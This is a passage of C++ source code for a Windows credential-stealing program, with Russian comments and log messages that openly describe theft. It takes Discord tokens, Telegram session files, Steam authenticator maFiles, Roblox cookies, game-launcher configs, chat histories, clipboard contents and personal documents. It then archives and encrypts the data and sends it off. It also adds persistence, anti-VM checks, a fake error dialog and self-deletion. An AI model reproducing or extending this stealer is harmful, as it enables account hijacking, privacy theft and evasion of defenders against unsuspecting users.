    emitLog("Начало кражи токенов Discord...");

    std::string discordDir = dir + "\\DiscordData";
    try {
        std::filesystem::create_directories(discordDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных Discord: " + QString::fromStdString(e.what()));
        return "";
    }

    std::string result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        emitLog("Ошибка: Не удалось получить путь к APPDATA для Discord");
        free(appDataPath);
        return "";
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string discordPath = appData + "\\discord\\Local Storage\\leveldb\\";
    if (!std::filesystem::exists(discordPath)) {
        emitLog("Директория Discord не найдена");
        return "";
    }

    std::string tokensPath = discordDir + "\\discord_tokens.txt";
    std::ofstream outFile(tokensPath);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать файл для токенов Discord");
        return "";
    }

    std::string tokens;
    try {
        for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
            if (entry.path().extension() == ".ldb") {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    emitLog("Не удалось открыть файл: " + QString::fromStdString(entry.path().string()));
                    continue;
                }
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                // Ищем токены Discord
                std::regex tokenRegex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
                std::smatch match;
                std::string::const_iterator searchStart(content.cbegin());
                while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                    tokens += "Token: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }
            }
        }
    } catch (const std::exception& e) {
        emitLog("Ошибка при обработке данных Discord: " + QString::fromStdString(e.what()));
    }

    if (!tokens.empty()) {
        outFile << tokens;
        outFile.close();
        emitLog("Токены Discord сохранены: " + QString::fromStdString(tokensPath));
        collectedFiles.push_back(tokensPath);
        result = tokens;
    } else {
        outFile.close();
        emitLog("Токены Discord не найдены");
        std::filesystem::remove(tokensPath);
    }

    emitLog("Кража токенов Discord завершена");
    return result;
}

// Кража данных Telegram
std::string MainWindow::StealTelegramData(const std::string& dir) {
    emitLog("Начало кражи данных Telegram...");

    std::string telegramDir = dir + "\\TelegramData";
    try {
        std::filesystem::create_directories(telegramDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных Telegram: " + QString::fromStdString(e.what()));
        return "";
    }

    std::string result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        emitLog("Ошибка: Не удалось получить путь к APPDATA для Telegram");
        free(appDataPath);
        return "";
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string telegramPath = appData + "\\Telegram Desktop\\tdata";
    if (!std::filesystem::exists(telegramPath)) {
        emitLog("Директория Telegram не найдена: " + QString::fromStdString(telegramPath));
        return "";
    }

    std::string keyFilePath = telegramPath + "\\key_data";
    std::string dataDirPath = telegramPath;
    std::string destKeyPath = telegramDir + "\\key_data";
    std::string destDataDir = telegramDir + "\\tdata";

    try {
        if (std::filesystem::exists(keyFilePath)) {
            std::filesystem::copy_file(keyFilePath, destKeyPath, std::filesystem::copy_options::overwrite_existing);
            emitLog("Файл key_data Telegram скопирован: " + QString::fromStdString(destKeyPath));
            collectedFiles.push_back(destKeyPath);
            result += "Key Data: " + destKeyPath + "\n";
        } else {
            emitLog("Файл key_data Telegram не найден");
        }

        if (std::filesystem::exists(dataDirPath)) {
            std::filesystem::create_directories(destDataDir);
            for (const auto& entry : std::filesystem::directory_iterator(dataDirPath)) {
                if (entry.path().filename().string().find("map") != std::string::npos ||
                    entry.path().filename().string().find("settings") != std::string::npos) {
                    std::string destFilePath = destDataDir + "\\" + entry.path().filename().string();
                    std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
                    collectedFiles.push_back(destFilePath);
                    result += "Session File: " + destFilePath + "\n";
                }
            }
            emitLog("Данные сессии Telegram скопированы в: " + QString::fromStdString(destDataDir));
        } else {
            emitLog("Директория tdata Telegram не найдена");
        }
    } catch (const std::exception& e) {
        emitLog("Ошибка при копировании данных Telegram: " + QString::fromStdString(e.what()));
    }

    emitLog("Кража данных Telegram завершена");
    return result;
}

// Кража данных Steam
std::string MainWindow::StealSteamData(const std::string& dir) {
    emitLog("Начало кражи данных Steam...");

    std::string steamDir = dir + "\\SteamData";
    try {
        std::filesystem::create_directories(steamDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных Steam: " + QString::fromStdString(e.what()));
        return "";
    }

    std::string result;

    HKEY hKey;
    std::string steamPath;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Valve\\Steam", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[1024];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SteamPath", nullptr, nullptr, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            steamPath = std::string(buffer);
        }
        RegCloseKey(hKey);
    }

    if (steamPath.empty()) {
        emitLog("Ошибка: Не удалось определить путь к Steam через реестр");
        return "";
    }

    std::string configPath = steamPath + "\\config";
    std::string ssfnPath;
    for (const auto& entry : std::filesystem::directory_iterator(steamPath)) {
        if (entry.path().filename().string().find("ssfn") != std::string::npos) {
            ssfnPath = entry.path().string();
            break;
        }
    }

    try {
        if (std::filesystem::exists(configPath + "\\config.vdf")) {
            std::string destConfigPath = steamDir + "\\config.vdf";
            std::filesystem::copy_file(configPath + "\\config.vdf", destConfigPath, std::filesystem::copy_options::overwrite_existing);
            emitLog("Файл config.vdf Steam скопирован: " + QString::fromStdString(destConfigPath));
            collectedFiles.push_back(destConfigPath);
            result += "Config: " + destConfigPath + "\n";
        }

        if (!ssfnPath.empty() && std::filesystem::exists(ssfnPath)) {
            std::string destSsfnPath = steamDir + "\\" + std::filesystem::path(ssfnPath).filename().string();
            std::filesystem::copy_file(ssfnPath, destSsfnPath, std::filesystem::copy_options::overwrite_existing);
            emitLog("Файл SSFN Steam скопирован: " + QString::fromStdString(destSsfnPath));
            collectedFiles.push_back(destSsfnPath);
            result += "SSFN: " + destSsfnPath + "\n";
        }

        if (config.steamMAFile) {
            std::string maFilesPath = steamPath + "\\steamapps\\common\\Steam Mobile\\maFiles";
            if (std::filesystem::exists(maFilesPath)) {
                std::string destMaFilesDir = steamDir + "\\maFiles";
                std::filesystem::create_directories(destMaFilesDir);
                for (const auto& entry : std::filesystem::directory_iterator(maFilesPath)) {
                    if (entry.path().extension() == ".maFile") {
                        std::string destFilePath = destMaFilesDir + "\\" + entry.path().filename().string();
                        std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
                        collectedFiles.push_back(destFilePath);
                        result += "MAFile: " + destFilePath + "\n";
                    }
                }
                emitLog("MAFiles Steam скопированы в: " + QString::fromStdString(destMaFilesDir));
            } else {
                emitLog("Директория MAFiles Steam не найдена");
            }
        }
    } catch (const std::exception& e) {
        emitLog("Ошибка при копировании данных Steam: " + QString::fromStdString(e.what()));
    }

    emitLog("Кража данных Steam завершена");
    return result;
}

// Кража данных Epic Games
std::string MainWindow::StealEpicGamesData(const std::string& dir) {
    emitLog("Начало кражи данных Epic Games...");

    std::string epicDir = dir + "\\EpicGamesData";
    try {
        std::filesystem::create_directories(epicDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных Epic Games: " + QString::fromStdString(e.what()));
        return "";
    }

    std::string result;

    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        emitLog("Ошибка: Не удалось получить путь к LOCALAPPDATA для Epic Games");
        free(localAppDataPath);
        return "";
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string epicPath = localAppData + "\\EpicGamesLauncher\\Saved\\Config";
    if (!std::filesystem::exists(epicPath)) {
        emitLog("Директория Epic Games не найдена");
        return "";
    }

    try {
        std::string destEpicDir = epicDir + "\\Config";
        std::filesystem::create_directories(destEpicDir);
        for (const auto& entry : std::filesystem::recursive_directory_iterator(epicPath)) {
            if (entry.path().extension() == ".ini") {
                std::string relativePath = std::filesystem::relative(entry.path(), epicPath).string();
                std::string destFilePath = destEpicDir + "\\" + relativePath;
                std::filesystem::create_directories(std::filesystem::path(destFilePath).parent_path());
                std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
                collectedFiles.push_back(destFilePath);
                result += "Config File: " + destFilePath + "\n";
            }
        }
        emitLog("Конфигурационные файлы Epic Games скопированы в: " + QString::fromStdString(destEpicDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка при копировании данных Epic Games: " + QString::fromStdString(e.what()));
    }

    emitLog("Кража данных Epic Games завершена");
    return result;
}

// Кража данных Roblox
std::string MainWindow::StealRobloxData(const std::string& dir) {
    emitLog("Начало кражи данных Roblox...");

    std::string robloxDir = dir + "\\RobloxData";
    try {
        std::filesystem::create_directories(robloxDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных Roblox: " + QString::fromStdString(e.what()));
        return "";
    }

    std::string result;

    std::string browserData = stealBrowserData(dir);
    std::string cookiesPath = robloxDir + "\\roblox_cookies.txt";
    std::ofstream outFile(cookiesPath);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать файл для куки Roblox");
        return "";
    }

    std::string cookies;
    std::regex robloxCookieRegex("(.ROBLOSECURITY=.*?);");
    std::smatch match;
    std::string::const_iterator searchStart(browserData.cbegin());
    while (std::regex_search(searchStart, browserData.cend(), match, robloxCookieRegex)) {
        cookies += "Cookie: " + match[1].str() + "\n";
        searchStart = match.suffix().first;
    }

    if (!cookies.empty()) {
        outFile << cookies;
        outFile.close();
        emitLog("Куки Roblox сохранены: " + QString::fromStdString(cookiesPath));
        collectedFiles.push_back(cookiesPath);
        result = cookies;
    } else {
        outFile.close();
        emitLog("Куки Roblox не найдены");
        std::filesystem::remove(cookiesPath);
    }

    emitLog("Кража данных Roblox завершена");
    return result;
}

// Кража данных Battle.net
std::string MainWindow::StealBattleNetData(const std::string& dir) {
    emitLog("Начало кражи данных Battle.net...");

    std::string battleNetDir = dir + "\\BattleNetData";
    try {
        std::filesystem::create_directories(battleNetDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных Battle.net: " + QString::fromStdString(e.what()));
        return "";
    }

    std::string result;

    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        emitLog("Ошибка: Не удалось получить путь к LOCALAPPDATA для Battle.net");
        free(localAppDataPath);
        return "";
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string battleNetPath = localAppData + "\\Battle.net";
    if (!std::filesystem::exists(battleNetPath)) {
        emitLog("Директория Battle.net не найдена");
        return "";
    }

    try {
        std::string destBattleNetDir = battleNetDir + "\\Config";
        std::filesystem::create_directories(destBattleNetDir);
        for (const auto& entry : std::filesystem::recursive_directory_iterator(battleNetPath)) {
            if (entry.path().extension() == ".config" || entry.path().filename() == "Battle.net.config") {
                std::string relativePath = std::filesystem::relative(entry.path(), battleNetPath).string();
                std::string destFilePath = destBattleNetDir + "\\" + relativePath;
                std::filesystem::create_directories(std::filesystem::path(destFilePath).parent_path());
                std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
                collectedFiles.push_back(destFilePath);
                result += "Config File: " + destFilePath + "\n";
            }
        }
        emitLog("Конфигурационные файлы Battle.net скопированы в: " + QString::fromStdString(destBattleNetDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка при копировании данных Battle.net: " + QString::fromStdString(e.what()));
    }

    emitLog("Кража данных Battle.net завершена");
    return result;
}

// Кража данных Minecraft
std::string MainWindow::StealMinecraftData(const std::string& dir) {
    emitLog("Начало кражи данных Minecraft...");

    std::string minecraftDir = dir + "\\MinecraftData";
    try {
        std::filesystem::create_directories(minecraftDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных Minecraft: " + QString::fromStdString(e.what()));
        return "";
    }

    std::string result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        emitLog("Ошибка: Не удалось получить путь к APPDATA для Minecraft");
        free(appDataPath);
        return "";
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string minecraftPath = appData + "\\.minecraft";
    if (!std::filesystem::exists(minecraftPath)) {
        emitLog("Директория Minecraft не найдена");
        return "";
    }

    try {
        std::string profilesPath = minecraftPath + "\\launcher_profiles.json";
        if (std::filesystem::exists(profilesPath)) {
            std::string destProfilesPath = minecraftDir + "\\launcher_profiles.json";
            std::filesystem::copy_file(profilesPath, destProfilesPath, std::filesystem::copy_options::overwrite_existing);
            emitLog("Файл launcher_profiles.json Minecraft скопирован: " + QString::fromStdString(destProfilesPath));
            collectedFiles.push_back(destProfilesPath);
            result += "Profiles: " + destProfilesPath + "\n";
        }

        std::string modsPath = minecraftPath + "\\mods";
        if (std::filesystem::exists(modsPath)) {
            std::string destModsDir = minecraftDir + "\\mods";
            std::filesystem::create_directories(destModsDir);
            for (const auto& entry : std::filesystem::directory_iterator(modsPath)) {
                if (entry.path().extension() == ".jar") {
                    std::string destFilePath = destModsDir + "\\" + entry.path().filename().string();
                    std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
                    collectedFiles.push_back(destFilePath);
                    result += "Mod: " + destFilePath + "\n";
                }
            }
            emitLog("Моды Minecraft скопированы в: " + QString::fromStdString(destModsDir));
        }
    } catch (const std::exception& e) {
        emitLog("Ошибка при копировании данных Minecraft: " + QString::fromStdString(e.what()));
    }

    emitLog("Кража данных Minecraft завершена");
    return result;
}

// Функция для граббинга файлов
std::vector<std::string> MainWindow::GrabFiles(const std::string& dir) {
    emitLog("Начало граббинга файлов...");

    std::string grabDir = dir + "\\GrabbedFiles";
    try {
        std::filesystem::create_directories(grabDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для граббинга файлов: " + QString::fromStdString(e.what()));
        return {};
    }

    std::vector<std::string> grabbedFiles;

    char* userProfilePath = nullptr;
    size_t len;
    if (_dupenv_s(&userProfilePath, &len, "USERPROFILE") != 0 || !userProfilePath) {
        emitLog("Ошибка: Не удалось получить путь к USERPROFILE для граббинга файлов");
        free(userProfilePath);
        return {};
    }
    std::string userProfile(userProfilePath);
    free(userProfilePath);

    std::vector<std::string> targetDirs = {
        userProfile + "\\Desktop",
        userProfile + "\\Documents",
        userProfile + "\\Downloads"
    };

    std::vector<std::string> targetExtensions = {".txt", ".docx", ".pdf", ".jpg", ".png"};

    for (const auto& targetDir : targetDirs) {
        if (!std::filesystem::exists(targetDir)) {
            emitLog("Директория не найдена: " + QString::fromStdString(targetDir));
            continue;
        }

        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(targetDir)) {
                if (entry.is_regular_file()) {
                    auto ext = entry.path().extension().string();
                    if (std::find(targetExtensions.begin(), targetExtensions.end(), ext) != targetExtensions.end()) {
                        std::string destFilePath = grabDir + "\\" + entry.path().filename().string();
                        std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
                        grabbedFiles.push_back(destFilePath);
                        emitLog("Файл скопирован: " + QString::fromStdString(destFilePath));
                    }
                }
            }
        } catch (const std::exception& e) {
            emitLog("Ошибка при граббинге файлов из " + QString::fromStdString(targetDir) + ": " + QString::fromStdString(e.what()));
        }
    }

    emitLog("Граббинг файлов завершен");
    return grabbedFiles;
}

// Кража истории чатов
std::string MainWindow::stealChatHistory(const std::string& dir) {
    emitLog("Начало кражи истории чатов...");

    std::string chatDir = dir + "\\ChatHistory";
    try {
        std::filesystem::create_directories(chatDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для истории чатов: " + QString::fromStdString(e.what()));
        return "";
    }

    std::string result;

    if (config.discord) {
        char* appDataPath = nullptr;
        size_t len;
        if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
            emitLog("Ошибка: Не удалось получить путь к APPDATA для истории чатов Discord");
            free(appDataPath);
            return "";
        }
        std::string appData(appDataPath);
        free(appDataPath);

        std::string discordPath = appData + "\\discord\\Local Storage\\leveldb\\";
        if (!std::filesystem::exists(discordPath)) {
            emitLog("Директория истории чатов Discord не найдена");
        } else {
            std::string messagesPath = chatDir + "\\discord_messages.txt";
            std::ofstream outFile(messagesPath);
            if (!outFile.is_open()) {
                emitLog("Ошибка: Не удалось создать файл для сообщений Discord");
            } else {
                std::string messages;
                try {
                    for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                        if (entry.path().extension() == ".ldb") {
                            std::ifstream file(entry.path(), std::ios::binary);
                            if (!file.is_open()) {
                                emitLog("Не удалось открыть файл: " + QString::fromStdString(entry.path().string()));
                                continue;
                            }
                            std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                            file.close();

                            std::regex messageRegex("\"content\":\"([^\"]+)\",\"timestamp\":\"([^\"]+)\"");
                            std::smatch match;
                            std::string::const_iterator searchStart(content.cbegin());
                            while (std::regex_search(searchStart, content.cend(), match, messageRegex)) {
                                messages += "Message: " + match[1].str() + "\n";
                                messages += "Timestamp: " + match[2].str() + "\n\n";
                                searchStart = match.suffix().first;
                            }
                        }
                    }
                } catch (const std::exception& e) {
                    emitLog("Ошибка при обработке истории чатов Discord: " + QString::fromStdString(e.what()));
                }

                if (!messages.empty()) {
                    outFile << messages;
                    outFile.close();
                    emitLog("Сообщения Discord сохранены: " + QString::fromStdString(messagesPath));
                    collectedFiles.push_back(messagesPath);
                    result += "Discord Messages: " + messagesPath + "\n";
                } else {
                    outFile.close();
                    emitLog("Сообщения Discord не найдены");
                    std::filesystem::remove(messagesPath);
                }
            }

            try {
                for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                    if (entry.path().extension() == ".ldb") {
                        std::string outPath = chatDir + "\\discord_chat_" + entry.path().filename().string();
                        std::filesystem::copy_file(entry.path(), outPath, std::filesystem::copy_options::overwrite_existing);
                        emitLog("Файл LevelDB Discord сохранен: " + QString::fromStdString(outPath));
                        collectedFiles.push_back(outPath);
                        result += "Discord LevelDB: " + outPath + "\n";
                    }
                }
            } catch (const std::exception& e) {
                emitLog("Ошибка копирования файлов LevelDB Discord: " + QString::fromStdString(e.what()));
            }
        }
    }

    if (config.telegram) {
        char* appDataPath = nullptr;
        size_t len;
        if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
            emitLog("Ошибка: Не удалось получить путь к APPDATA для истории чатов Telegram");
            free(appDataPath);
            return "";
        }
        std::string appData(appDataPath);
        free(appDataPath);

        std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
        if (!std::filesystem::exists(telegramPath)) {
            emitLog("Директория истории чатов Telegram не найдена");
        } else {
            std::string chatDataPath = chatDir + "\\telegram_chat_data.txt";
            std::ofstream outFile(chatDataPath);
            if (!outFile.is_open()) {
                emitLog("Ошибка: Не удалось создать файл для данных чатов Telegram");
            } else {
                std::string chatData;
                try {
                    std::vector<std::string> telegramFiles;
                    for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
                        std::string filename = entry.path().filename().string();
                        if (filename.find("key_data") != std::string::npos || filename.find("chat_") != std::string::npos) {
                            std::string outPath = chatDir + "\\telegram_" + filename;
                            std::filesystem::copy_file(entry.path(), outPath, std::filesystem::copy_options::overwrite_existing);
                            emitLog("Файл Telegram сохранен: " + QString::fromStdString(outPath));
                            collectedFiles.push_back(outPath);
                            telegramFiles.push_back(outPath);
                            result += "Telegram File: " + outPath + "\n";
                        }
                    }

                    for (const auto& filePath : telegramFiles) {
                        if (filePath.find("chat_") != std::string::npos) {
                            std::ifstream file(filePath, std::ios::binary);
                            if (!file.is_open()) {
                                emitLog("Не удалось открыть файл Telegram: " + QString::fromStdString(filePath));
                                continue;
                            }
                            std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                            file.close();

                            std::regex textRegex("[\\w\\s\\p{P}]{10,}");
                            std::smatch match;
                            std::string::const_iterator searchStart(content.cbegin());
                            while (std::regex_search(searchStart, content.cend(), match, textRegex)) {
                                chatData += "Possible Message: " + match[0].str() + "\n";
                                searchStart = match.suffix().first;
                            }
                        }
                    }
                } catch (const std::exception& e) {
                    emitLog("Ошибка при обработке данных Telegram: " + QString::fromStdString(e.what()));
                }

                if (!chatData.empty()) {
                    outFile << chatData;
                    outFile.close();
                    emitLog("Данные чатов Telegram сохранены: " + QString::fromStdString(chatDataPath));
                    collectedFiles.push_back(chatDataPath);
                    result += "Telegram Chat Data: " + chatDataPath + "\n";
                } else {
                    outFile.close();
                    emitLog("Данные чатов Telegram не найдены");
                    std::filesystem::remove(chatDataPath);
                }
            }
        }
    }

    emitLog("Кража истории чатов завершена");
    return result;
}

// Сбор данных для социальной инженерии
std::string MainWindow::collectSocialEngineeringData(const std::string& dir) {
    emitLog("Сбор данных для социальной инженерии...");

    std::string seDir = dir + "\\SocialEngineering";
    try {
        std::filesystem::create_directories(seDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных социальной инженерии: " + QString::fromStdString(e.what()));
        return "";
    }

    std::string seDataPath = seDir + "\\social_engineering.txt";
    std::ofstream outFile(seDataPath);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать файл для данных социальной инженерии");
        return "";
    }

    std::string seData;

    char username[UNLEN + 1];
    DWORD usernameLen = UNLEN + 1;
    if (GetUserNameA(username, &usernameLen)) {
        seData += "Username: " + std::string(username) + "\n";
    } else {
        emitLog("Ошибка: Не удалось получить имя пользователя: " + QString::number(GetLastError()));
    }

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        seData += "\nInstalled Programs:\n";
        DWORD index = 0;
        char subKeyName[255];
        DWORD subKeyNameLen = 255;
        while (RegEnumKeyExA(hKey, index, subKeyName, &subKeyNameLen, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
            HKEY subKey;
            if (RegOpenKeyExA(hKey, subKeyName, 0, KEY_READ, &subKey) == ERROR_SUCCESS) {
                char displayName[255];
                DWORD displayNameLen = sizeof(displayName);
                if (RegQueryValueExA(subKey, "DisplayName", nullptr, nullptr, (LPBYTE)displayName, &displayNameLen) == ERROR_SUCCESS) {
                    seData += "- " + std::string(displayName) + "\n";
                }
                RegCloseKey(subKey);
            }
            index++;
            subKeyNameLen = 255;
        }
        RegCloseKey(hKey);
    } else {
        emitLog("Ошибка: Не удалось открыть реестр для списка установленных программ");
    }

    char* userProfilePath = nullptr;
    size_t len;
    if (_dupenv_s(&userProfilePath, &len, "USERPROFILE") != 0 || !userProfilePath) {
        emitLog("Ошибка: Не удалось получить путь к USERPROFILE для недавних файлов");
        free(userProfilePath);
    } else {
        std::string recentPath = std::string(userProfilePath) + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent";
        free(userProfilePath);
        if (std::filesystem::exists(recentPath)) {
            seData += "\nRecent Files:\n";
            try {
                for (const auto& entry : std::filesystem::directory_iterator(recentPath)) {
                    if (entry.path().extension() == ".lnk") {
                        seData += "- " + entry.path().filename().string() + "\n";
                    }
                }
            } catch (const std::exception& e) {
                emitLog("Ошибка при получении недавних файлов: " + QString::fromStdString(e.what()));
            }
        } else {
            emitLog("Директория Recent не найдена");
        }
    }

    if (OpenClipboard(nullptr)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            char* clipboardText = (char*)GlobalLock(hData);
            if (clipboardText) {
                seData += "\nClipboard Data:\n" + std::string(clipboardText) + "\n";
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    } else {
        emitLog("Ошибка: Не удалось получить доступ к буферу обмена");
    }

    outFile << seData;
    outFile.close();
    emitLog("Данные для социальной инженерии сохранены: " + QString::fromStdString(seDataPath));
    collectedFiles.push_back(seDataPath);
    return seData;
}

// Основной метод кражи и отправки данных
void MainWindow::StealAndSendData(const std::string& tempDir) {
    emitLog("Запуск процесса кражи и отправки данных...");

    // Настройка персистентности и автозагрузки
    setupPersistence();

    collectedFiles.clear();
    collectedData.clear();

    if (config.antiVM && isRunningInVM()) {
        emitLog("Обнаружена виртуальная машина. Прерывание выполнения.");
        return;
    }

    if (config.fakeError) {
        MessageBoxA(nullptr, "Application has encountered a critical error and needs to close.", "Error", MB_ICONERROR | MB_OK);
    }

    // Создание временной директории
    try {
        std::filesystem::create_directories(tempDir);
        emitLog("Временная директория создана: " + QString::fromStdString(tempDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка создания временной директории: " + QString::fromStdString(e.what()));
        return;
    }

    // Сбор данных
    if (config.systemInfo) {
        std::string sysInfo = collectSystemInfo(tempDir);
        if (!sysInfo.empty()) {
            collectedData += "System Info:\n" + sysInfo + "\n";
            collectedFiles.push_back(sysInfo);
        }
    }

    if (config.screenshot) {
        std::string screenshotPath = TakeScreenshot(tempDir);
        if (!screenshotPath.empty()) {
            collectedData += "Screenshot:\n" + screenshotPath + "\n";
            collectedFiles.push_back(screenshotPath);
        }
    }

    if (config.cookies || config.passwords) {
        std::string browserData = stealBrowserData(tempDir);
        if (!browserData.empty()) {
            collectedData += "Browser Data:\n" + browserData + "\n";
        }
    }

    if (config.discord) {
        std::string discordTokens = StealDiscordTokens(tempDir);
        if (!discordTokens.empty()) {
            collectedData += "Discord Tokens:\n" + discordTokens + "\n";
        }
    }

    if (config.telegram) {
        std::string telegramData = StealTelegramData(tempDir);
        if (!telegramData.empty()) {
            collectedData += "Telegram Data:\n" + telegramData + "\n";
        }
    }

    if (config.steam) {
        std::string steamData = StealSteamData(tempDir);
        if (!steamData.empty()) {
            collectedData += "Steam Data:\n" + steamData + "\n";
        }
    }

    if (config.epic) {
        std::string epicData = StealEpicGamesData(tempDir);
        if (!epicData.empty()) {
            collectedData += "Epic Games Data:\n" + epicData + "\n";
        }
    }

    if (config.roblox) {
        std::string robloxData = StealRobloxData(tempDir);
        if (!robloxData.empty()) {
            collectedData += "Roblox Data:\n" + robloxData + "\n";
        }
    }

    if (config.battlenet) {
        std::string battleNetData = StealBattleNetData(tempDir);
        if (!battleNetData.empty()) {
            collectedData += "Battle.net Data:\n" + battleNetData + "\n";
        }
    }

    if (config.minecraft) {
        std::string minecraftData = StealMinecraftData(tempDir);
        if (!minecraftData.empty()) {
            collectedData += "Minecraft Data:\n" + minecraftData + "\n";
        }
    }

    if (config.fileGrabber) {
        std::vector<std::string> grabbedFiles = GrabFiles(tempDir);
        if (!grabbedFiles.empty()) {
            collectedData += "Grabbed Files:\n";
            for (const auto& file : grabbedFiles) {
                collectedData += file + "\n";
                collectedFiles.push_back(file);
            }
        }
    }

    if (config.chatHistory) {
        std::string chatHistory = stealChatHistory(tempDir);
        if (!chatHistory.empty()) {
            collectedData += "Chat History:\n" + chatHistory + "\n";
        }
    }

    if (config.socialEngineering) {
        std::string seData = collectSocialEngineeringData(tempDir);
        if (!seData.empty()) {
            collectedData += "Social Engineering Data:\n" + seData + "\n";
        }
    }

    // Проверка, есть ли данные для отправки
    if (!collectedData.empty() || !collectedFiles.empty()) {
        emitLog("Собрано данных: " + QString::number(collectedData.size()) + " байт, файлов: " + QString::number(collectedFiles.size()));

        // Упаковываем собранные файлы в ZIP
        std::string zipPath;
        if (!collectedFiles.empty()) {
            zipPath = archiveData(tempDir, collectedFiles);
            if (zipPath.empty()) {
                emitLog("Ошибка: Не удалось создать ZIP-архив");
                std::filesystem::remove_all(tempDir);
                return;
            }
            // Очищаем collectedFiles и добавляем только ZIP-архив
            collectedFiles.clear();
            collectedFiles.push_back(zipPath);
        }

        // Шифруем текстовые данные
        std::string encryptedData = encryptData(collectedData);
        if (!encryptedData.empty()) {
            emitLog("Данные зашифрованы, размер: " + QString::number(encryptedData.size()) + " байт");

            // Сохраняем зашифрованные данные в файл для отправки
            std::string encryptedDataPath = tempDir + "\\encrypted_data.txt";
            std::ofstream encryptedFile(encryptedDataPath, std::ios::binary);
            if (encryptedFile.is_open()) {
                encryptedFile.write(encryptedData.data(), encryptedData.size());
                encryptedFile.close();
                collectedFiles.push_back(encryptedDataPath);
                emitLog("Зашифрованные данные сохранены в: " + QString::fromStdString(encryptedDataPath));
            } else {
                emitLog("Ошибка: Не удалось сохранить зашифрованные данные в файл");
                std::filesystem::remove_all(tempDir);
                return;
            }

            // Отправляем данные
            sendData(QString::fromStdString(encryptedData), collectedFiles);
        } else {
            emitLog("Ошибка: Не удалось зашифровать данные");
        }
    } else {
        emitLog("Нет данных для отправки");
    }

    // Очистка временной директории
    try {
        std::filesystem::remove_all(tempDir);
        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка при удалении временной директории: " + QString::fromStdString(e.what()));
    }

    // Самоуничтожение, если включено
    if (config.selfDestruct) {
        emitLog("Запуск самоуничтожения...");
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        std::string batchFile = "self_destruct.bat";
        std::ofstream batFile(batchFile);
        if (batFile.is_open()) {
            batFile << "@echo off\n";
            batFile << "timeout /t 2 /nobreak >nul\n";
            batFile << "del \"" << exePath << "\"\n";
            batFile << "del \"%~f0\"\n";
            batFile.close();
            system(("start /min " + batchFile).c_str());
        }
        QApplication::quit();
    }

    emitLog("Процесс кражи и отправки данных завершен");
}

// Запуск процесса кражи в отдельном потоке
void MainWindow::startStealProcess() {
